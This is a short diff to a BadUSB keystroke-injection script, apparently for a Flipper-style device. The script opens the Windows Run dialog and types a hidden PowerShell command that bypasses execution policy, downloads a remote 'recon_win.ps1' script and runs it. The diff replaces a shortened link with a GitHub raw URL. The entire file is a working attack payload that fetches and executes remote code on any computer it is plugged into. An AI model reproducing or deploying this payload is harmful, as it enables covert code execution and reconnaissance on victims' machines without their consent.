@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm link.lol | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm raw.githubusercontent.com/h0ek/cyber_dolphin/main/badusb/recon_win/recon_win.ps1 | iex
 ENTER
